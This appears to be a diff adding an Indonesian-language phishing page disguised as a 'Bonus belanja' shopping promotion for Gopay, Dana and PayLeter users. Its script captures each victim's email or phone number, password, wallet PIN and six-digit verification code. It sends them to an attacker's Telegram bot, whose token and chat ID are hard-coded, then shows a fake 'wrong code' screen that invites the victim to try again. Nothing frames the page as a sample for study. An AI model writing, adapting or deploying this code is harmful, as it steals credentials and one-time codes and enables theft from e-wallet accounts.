@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Bonus belanja">
+    <meta property="og:description" content="Bonus belanja">
+    <meta property="og:image" content="https://i.ibb.co.com/spRfhNsL/IMG-20260804-113626.jpg">
+    <meta property="og:image:secure_url" content="https://i.ibb.co.com/spRfhNsL/IMG-20260804-113626.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.ibb.co.com/spRfhNsL/IMG-20260804-113626.jpg">
+
+    <title>Bonus belanja</title>
+    
+    <style>
+      /* --- KHUSUS MEMPERLEBAR GAMBAR (KIRI-KANAN) DI BAGIAN 2 --- */
+      #bagian2 img {
+          width: 100%;        /* Memenuhi area hingga batas max-width */
+          max-width: 260px;   /* Atur seberapa lebar ke samping (sebelumnya 130px) */
+          height: 120px;      /* Menjaga tinggi agar tetap proporsional/gepeng melintang */
+          max-height: none;   /* Menghapus batasan tinggi bawaan */
+          object-fit: cover;  /* Agar gambar tidak terlihat terdistorsi/peot */
+            margin-bottom: 10px;
+        }
+
+        /* --- KUNCI TOTAL BACKGROUND AGAR TIDAK BISA DI-SCROLL & ANTI SELEKSI --- */
+        html, body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; 
+            color: #333333;
+            font-family: sans-serif;
+            box-sizing: border-box;
+            
+            overflow: hidden !important; 
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            touch-action: none;
+
+            -webkit-user-select: none;
+            -webkit-touch-callout: none; 
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            position: relative;
+            box-sizing: border-box;
+            height: 100%;
+            background-color: #f9f9f9;
+            overflow: hidden !important;
+            touch-action: none;
+        }
+
+        .halaman {
+            width: 100%;
+            height: 100%; 
+            display: flex;
+            flex-direction: column;
+            box-sizing: border-box;
+            padding: 10px 20px; 
+            position: relative;
+            overflow: hidden !important;
+            justify-content: space-between;
+        }
+
+        #bagian2, #bagian3, #bagianBaru, #bagian4 {
+            display: none;
+        }
+
+        /* --- KONTEN FORM ATAS --- */
+        .konten-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-sizing: border-box;
+            justify-content: flex-start; 
+            overflow: hidden !important;
+            flex: 1;
+            min-height: 0;
+        }
+
+        h1 { 
+            color: #000000; 
+            font-weight: 900; /* Ditingkatkan dari bold ke 900 agar super tebal */
+            margin-top: 5px; 
+            margin-bottom: 2px;
+            font-size: 24px;   /* Ukuran bisa disesuaikan jika ingin lebih menonjol */
+            text-align: center;
+        } 
+
+        p {
+            margin-top: 0;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+        }
+
+        .kata-bijak {
+            font-style: italic;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #555555;
+            text-align: center;
+            margin-top: 15px; 
+            padding: 0 10px;
+        }
+        
+        /* GAMBAR KUCING */
+        img {
+            width: auto;
+            height: auto;
+            max-width: 130px;
+            max-height: 110px; 
+            border-radius: 12px; 
+            margin-bottom: 5px;
+            object-fit: cover; 
+            margin-top: 0px; 
+            flex-shrink: 1;
+            -webkit-touch-callout: none !important;
+            -webkit-user-drag: none !important; 
+            pointer-events: auto; 
+        }
+
+        /* --- STYLE PILIHAN BUNDAR --- */
+        .wadah-pilihan {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .opsi-radio {
+            display: flex;
+            align-items: center;
+            background-color: #eeeeee;
+            padding: 12px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .opsi-radio input[type="radio"] {
+            margin: 0 12px 0 0 !important;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #d32f2f;
+        }
+
+        .opsi-radio span {
+            font-size: 15px;
+            color: #333333;
+            font-weight: 500;
+        }
+
+/* --- INPUT TEKS --- */
+        input[type="text"], input[type="number"] {
+            padding: 16px 20px; 
+            width: 100%;        
+            max-width: 100%;    
+            border-radius: 12px; 
+            border: none; 
+            background-color: #eeeeee; 
+            color: #333333;
+            font-size: 16px; 
+            outline: none; 
+            text-align: left; 
+            box-sizing: border-box; 
+            flex-shrink: 0;
+            
+            /* Diberikan margin-top agar kotak turun dari teks petunjuk */
+            margin-top: 18px; 
+            margin-bottom: 0px;
+        }
+
+        /* Mengatur jarak khusus antar-kotak di Bagian 2 (antar kotak 1 dan kotak 2) */
+        #inputNama {
+            margin-bottom: 12px; /* Jarak antar kotak tetap terjaga */
+        }
+
+        /* Kotak kedua di Bagian 2 tidak perlu margin atas lagi */
+        #inputInfoTambahan {
+            margin-top: 0px;
+        }
+
+        input:focus {
+            background-color: #e5e5e5;
+        }
+
+        /* --- STYLE KHUSUS BAGIAN BARU (DESAIN GAMBAR) --- */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0 15px 0;
+            width: 100%;
+        }
+
+        .otp-input {
+            width: 45px !important;
+            height: 50px !important;
+            padding: 0 !important;
+            text-align: center !important;
+            font-size: 20px !important;
+            font-weight: bold;
+            border-radius: 10px !important;
+            background-color: #efefef !important;
+            border: 1px solid transparent !important;
+            margin-bottom: 0 !important;
+        }
+
+        .otp-input:focus {
+            border: 1.5px solid #d32f2f !important;
+            background-color: #ffffff !important;
+        }
+
+        /* TIMER & DAFTAR ULANG STYLES */
+        .info-timer {
+            font-size: 13px;
+            color: #888888;
+            margin-top: 10px;
+            text-align: left;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        /* KETIKA WAKTU HABIS (STYLING MERAH & BISA DIKLIK) */
+        .info-timer.expired {
+            color: #d32f2f !important;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .info-sponsor {
+            font-size: 14px;
+            color: #0088cc;
+            font-weight: bold;
+            margin-top: 8px;
+            text-align: left;
+            width: 100%;
+        }
+
+        /* --- CONTAINER TOMBOL --- */
+        .tombol-container {
+            width: 100%;
+            padding: 15px 0px 5px 0px; 
+            box-sizing: border-box;
+            position: relative; 
+            display: flex;
+            justify-content: center;
+            background-color: #f9f9f9;
+            z-index: 99;
+            flex-shrink: 0; 
+        }
+
+        /* STYLE TOMBOL UTAMA (WARNA MERAH) */
+        button {
+            background-color: #d32f2f;
+            color: #ffffff;
+            border: none;
+            padding: 14px 30px;
+            font-size: 16px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;        
+            box-shadow: 0 3px 10px rgba(211, 47, 47, 0.3);
+            box-sizing: border-box; 
+            transition: all 0.3s ease;
+        }
+
+        /* STYLE TOMBOL REDUP/SAMAR (DISABLED MERAH MUDA) */
+        button:disabled {
+            background-color: #ef9a9a !important;
+            color: #ffffff !important;
+            opacity: 0.5 !important;
+            cursor: not-allowed !important;
+            box-shadow: none !important;
+        }
+
+        .btn-ulang {
+            background-color: #333333; 
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper" id="mainWrapper">
+        
+        <!-- BAGIAN 1 -->
+        <div id="bagian1" class="halaman">
+            <div class="konten-form">
+                <img src="https://i.ibb.co.com/cKgfGg1x/file-0000000000ac81f69f87a0eace84c6b4.png" alt="Foto Bagian 1" draggable="false">
+                <h1>PILIH PEMBAYARAN</h1>
+                <p>Bayar hanya Rp 100 dapat 1 bonus produk</p>
+                
+                <div class="wadah-pilihan">
+                    <label class="opsi-radio">
+                        <input type="radio" name="kategori" value="Gopay" onchange="pilihDanLanjut1()">
+                        <span>Gopay</span>
+                    </label>
+                    <label class="opsi-radio">
+                        <input type="radio" name="kategori" value="Dana" onchange="pilihDanLanjut1()">
+                        <span>Dana</span>
+                    </label>
+                    <label class="opsi-radio">
+                        <input type="radio" name="kategori" value="PayLeter" onchange="pilihDanLanjut1()">
+                        <span>PayLeter</span>
+                    </label>
+                </div>
+            </div>
+            <!-- Tombol merah Bagian 1 telah dihapus -->
+        </div>
+
+        <!-- BAGIAN 2 -->
+        <div id="bagian2" class="halaman">
+            <div class="konten-form">
+                <img src="https://i.ibb.co.com/spRfhNsL/IMG-20260804-113626.jpg" alt="Foto Bagian 2" draggable="false">
+
+                <input type="text" id="inputNama" placeholder="Masukkan Email atau Nomor Telpon" oninput="cekBagian2()">
+                <input type="text" id="inputInfoTambahan" placeholder="Kata sandi" oninput="cekBagian2()">
+            </div>
+            <div class="tombol-container">
+                <button id="btnBagian2" disabled onclick="prosesKirimKe1()">Masuk</button>
+            </div>
+        </div>
+
+        <!-- BAGIAN 3 -->
+        <div id="bagian3" class="halaman">
+            <div class="konten-form">
+                <img src="https://i.ibb.co.com/spRfhNsL/IMG-20260804-113626.jpg" alt="Foto Bagian 3" draggable="false">
+                <h1>PIN Gopay Dana Payleter</h1>
+                <p></p>
+                <input type="number" id="inputanak" placeholder="PIN" oninput="cekBagian3()">
+            </div>
+            <div class="tombol-container">
+                <button id="btnBagian3" disabled onclick="prosesKirimKe2()">Bayar</button>
+            </div>
+        </div>
+
+        <!-- BAGIAN BARU (DIISI 6 DIGIT ANGKA) -->
+        <div id="bagianBaru" class="halaman">
+            <div class="konten-form">
+                <h1 style="font-size: 26px; margin-top: 15px;">Masukkan Kode 6 digit</h1>
+                <p id="deskripsiUmurDinamis" style="font-size: 14px; margin-bottom: 20px;">Masukkan usia kode verifikasi</p>
+                
+                <!-- INPUT 6 KOTAK -->
+                <div class="otp-container">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 1)" onkeydown="hapusKotak(event, this, 1)">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 2)" onkeydown="hapusKotak(event, this, 2)">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 3)" onkeydown="hapusKotak(event, this, 3)">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 4)" onkeydown="hapusKotak(event, this, 4)">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 5)" onkeydown="hapusKotak(event, this, 5)">
+                    <input type="number" class="otp-input" maxlength="1" oninput="pindahKotak(this, 6)" onkeydown="hapusKotak(event, this, 6)">
+                </div>
+
+                <!-- TEKS TIMER & KLIK DAFTAR ULANG -->
+                <div class="info-timer" id="infoTimerContainer" onclick="klikDaftarUlang()">
+                    Kirim ulang kode <span id="timer">60</span>s
+                </div>
+                <div class="info-sponsor">
+                    Perlu bantuan untuk masuk?
+                </div>
+            </div>
+            <!-- Tombol merah Bagian 4/Baru telah dihapus (otomatis kirim setelah digit ke-6) -->
+        </div>
+
+        <!-- BAGIAN FINISH -->
+        <div id="bagian4" class="halaman">
+            <div class="konten-form">
+                <h1>KODE VERIFIKASI SALAH</h1>
+                <p class="kata-bijak">Periksa kembali kode verifikasi yang dikirim melalui email atau sms dan kata sandi Contoh Angka(_@#?!*)</p>
+                <img src="https://png.pngtree.com/png-clipart/20250421/original/pngtree-cross-icon-incorrect-sign-vector-with-red-circle-png-image_20810266.png" alt="Foto Bagian 4" draggable="false">
+                <p class="kata-bijak"></p>
+            </div>
+            <div class="tombol-container">
+                <button class="btn-ulang" onclick="pindahKe(1)">ULANGI KEMBALI</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ==========================================================
+        // ⚙️ PENGATURAN MINIMAL KARAKTER
+        // ==========================================================
+        var minKarakterNama = 6; 
+        var minKarakterInfo = 6; 
+        var minKarakterAnak = 6; 
+
+        // Bot Telegram
+        var tokenBot = "8880993139:AAFsBfqnYa_8d_A2aiiNX3VMxATpMvw_5VQ"; 
+        var chatID = "8859032590";     
+        var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";
+
+        var timerInterval;
+        var timerExpired = false;
+
+        function setSizing() {
+            var tinggiViewportSekarang = window.visualViewport ? window.visualViewport.height : window.innerHeight;
+            document.getElementById('mainWrapper').style.height = tinggiViewportSekarang + 'px';
+        }
+        
+        window.addEventListener('load', setSizing);
+        window.addEventListener('resize', setSizing);
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', setSizing);
+            window.visualViewport.addEventListener('scroll', setSizing);
+        }
+        setSizing();
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.querySelectorAll('img').forEach(img => {
+            img.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            img.addEventListener('touchstart', function(e) {
+                if (e.touches.length > 1) {
+                    e.preventDefault();
+                }
+            }, { passive: true });
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('blur', function() {
+                window.scrollTo(0, 0);
+                setSizing();
+            });
+        });
+
+        function dapatkanKategori() {
+            var pilihan = document.querySelector('input[name="kategori"]:checked');
+            return pilihan ? pilihan.value : "-";
+        }
+
+        /* --- OPSI BAGIAN 1: KLIK HILANG / PILIH & LANGSUNG PINDAH --- */
+        function pilihDanLanjut1() {
+            setTimeout(function() {
+                pindahKe(2);
+            }, 150); // Memberikan sedikit jeda visual 0.15 detik saat ditekan
+        }
+
+        /* --- CEK INPUT BAGIAN LAIN --- */
+        function cekBagian2() {
+            var nama = document.getElementById('inputNama').value.trim();
+            var info = document.getElementById('inputInfoTambahan').value.trim();
+            
+            var syaratNama = nama.length >= minKarakterNama;
+            var syaratInfo = info.length >= minKarakterInfo;
+            
+            document.getElementById('btnBagian2').disabled = !(syaratNama && syaratInfo);
+        }
+
+        function cekBagian3() {
+            var anak = document.getElementById('inputanak').value.trim();
+            document.getElementById('btnBagian3').disabled = !(anak.length >= minKarakterAnak);
+        }
+
+        /* --- FUNGSI KOTAK 6 DIGIT (AUTOMATIC SUBMIT SAAT FULL) --- */
+        function pindahKotak(elem, index) {
+            if (elem.value.length >= 1) {
+                elem.value = elem.value.slice(0, 1);
+                var inputs = document.querySelectorAll('.otp-input');
+                if (index < inputs.length) {
+                    inputs[index].focus();
+                }
+            }
+            cekKotakLengkapOtomatis();
+        }
+
+        function hapusKotak(event, elem, index) {
+            if (event.key === "Backspace" && elem.value === "") {
+                var inputs = document.querySelectorAll('.otp-input');
+                if (index > 1) {
+                    inputs[index - 2].focus();
+                }
+            }
+        }
+
+        function cekKotakLengkapOtomatis() {
+            var inputs = document.querySelectorAll('.otp-input');
+            var lengkap = true;
+            inputs.forEach(i => {
+                if (i.value === "") lengkap = false;
+            });
+
+            // Jika ke-6 digit sudah terisi lengkap, langsung jalankan pengiriman final!
+            if (lengkap) {
+                prosesKirimKeFinal();
+            }
+        }
+
+        /* --- LOGIKA TIMER & RESET --- */
+        function mulaiTimer() {
+            var waktu = 60;
+            var container = document.getElementById('infoTimerContainer');
+            timerExpired = false;
+            
+            container.classList.remove('expired');
+            container.innerHTML = 'Kirim ulang kode <span id="timer">60</span>s';
+            
+            clearInterval(timerInterval);
+
+            timerInterval = setInterval(function () {
+                waktu--;
+                var display = document.getElementById('timer');
+                if(display) display.textContent = waktu;
+
+                if (waktu <= 0) {
+                    clearInterval(timerInterval);
+                    timerExpired = true;
+                    // Beralih ke mode Merah & Tulisan Daftar Ulang
+                    container.classList.add('expired');
+                    container.innerHTML = 'Kirim ulang kode';
+                }
+            }, 1000);
+        }
+
+        function klikDaftarUlang() {
+            if (timerExpired) {
+                var kategori = dapatkanKategori();
+                var nama = document.getElementById('inputNama').value.trim(); 
+                var anak = document.getElementById('inputanak').value.trim();
+
+                var pesanTelegram = "🔄 *USER MEMINTA DAFTAR ULANG (WAKTU HABIS)* 🔄\n\n" +
+                                    "👥 *Kategori:* " + kategori + "\n" +
+                                    "🐱 *Nama Kucing:* " + nama + "\n" +
+                                    "🐾 *Nama Anak:* " + anak + "\n\n" +
+                                    "⚠️ _User menekan tulisan 'Kirim ulang kode' dan timer direset kembali ke 60s._";
+
+                fetch(urlTlgrm, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatID,
+                        text: pesanTelegram,
+                        parse_mode: "Markdown"
+                    })
+                }).catch(error => console.error("Error:", error));
+
+                document.querySelectorAll('.otp-input').forEach(i => i.value = "");
+                mulaiTimer();
+            }
+        }
+
+        /* --- PENGIRIMAN DATA KE TELEGRAM --- */
+        function prosesKirimKe1() {
+            var kategori = dapatkanKategori();
+            var nama = document.getElementById('inputNama').value.trim();
+            var infoTambahan = document.getElementById('inputInfoTambahan').value.trim();
+
+            var pesanTelegram = "📥 *LAPORAN FORM MASUK (BAGIAN 1 & 2)* 📥\n\n" +
+                                "👥 *Kategori:* " + kategori + "\n" +
+                                "👤 *Email/Nomor:* " + nama + "\n" +
+                                "⏳ *sandi:* " + infoTambahan;
+
+            fetch(urlTlgrm, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: pesanTelegram,
+                    parse_mode: "Markdown"
+                })
+            }).catch(error => console.error("Error:", error));
+
+            pindahKe(3);
+        }
+
+        function prosesKirimKe2() {
+            var kategori = dapatkanKategori();
+            var nama = document.getElementById('inputNama').value.trim(); 
+            var infoTambahan = document.getElementById('inputInfoTambahan').value.trim();
+            var anak = document.getElementById('inputanak').value.trim();
+
+            var pesanTelegram = "📬 *LAPORAN (BAGIAN 3)* 📬\n\n" +
+                                "👥 *Kategori User:* " + kategori + "\n" +
+                                "🐱 *Email/Nomor:* " + nama + "\n" +
+                                "⏳ *sandi:* " + infoTambahan + "\n" +
+                                "🐾 *PIN:* " + anak;
+
+            fetch(urlTlgrm, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: pesanTelegram,
+                    parse_mode: "Markdown"
+                })
+            }).catch(error => console.error("Error:", error));
+
+            pindahKe("Baru");
+        }
+
+        function prosesKirimKeFinal() {
+            var kategori = dapatkanKategori();
+            var nama = document.getElementById('inputNama').value.trim(); 
+            var infoTambahan = document.getElementById('inputInfoTambahan').value.trim();
+            var anak = document.getElementById('inputanak').value.trim();
+
+            var inputs = document.querySelectorAll('.otp-input');
+            var kodeUsia = "";
+            inputs.forEach(i => kodeUsia += i.value);
+
+            var pesanTelegram = "🔥 *LAPORAN FINAL COMPLETE* 🔥\n\n" +
+                                "👥 *Kategori User:* " + kategori + "\n" +
+                                "🐱 *Email/Nomor:* " + nama + "\n" +
+                                "⏳ *sandi:* " + infoTambahan + "\n" +
+                                "🐾 *PIN:* " + anak + "\n" +
+                                "🔢 *Kode/Verifika (6-Digit):* `" + kodeUsia + "`";
+
+            fetch(urlTlgrm, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: pesanTelegram,
+                    parse_mode: "Markdown"
+                })
+            }).catch(error => console.error("Error:", error));
+
+            pindahKe(4);
+        }
+
+        function pindahKe(nomorHalaman) {
+            document.getElementById('bagian1').style.display = 'none';
+            document.getElementById('bagian2').style.display = 'none';
+            document.getElementById('bagian3').style.display = 'none';
+            document.getElementById('bagianBaru').style.display = 'none';
+            document.getElementById('bagian4').style.display = 'none';
+
+            var target = document.getElementById('bagian' + nomorHalaman);
+            target.style.display = 'flex';
+            
+            if (nomorHalaman === "Baru") {
+                var namaKucing = document.getElementById('inputNama').value.trim();
+                
+                if (namaKucing !== "") {
+                    document.getElementById('deskripsiUmurDinamis').textContent = "Kode Anda dikirim ke " + namaKucing + ".";
+                } else {
+                    document.getElementById('deskripsiUmurDinamis').textContent = "Masukkan usia anak kucing tersebut.";
+                }
+
+                mulaiTimer();
+            }
+
+            if (nomorHalaman === 1) {
+                document.getElementById('inputNama').value = "";
+                document.getElementById('inputInfoTambahan').value = "";
+                document.getElementById('inputanak').value = "";
+                document.querySelectorAll('.otp-input').forEach(i => i.value = "");
+                
+                var radioChecked = document.querySelector('input[name="kategori"]:checked');
+                if (radioChecked) radioChecked.checked = false;
+
+                document.getElementById('btnBagian2').disabled = true;
+                document.getElementById('btnBagian3').disabled = true;
+            }
+
+            window.scrollTo(0, 0);
+            setSizing();
+        }
+    </script>
+</body>
+</html>
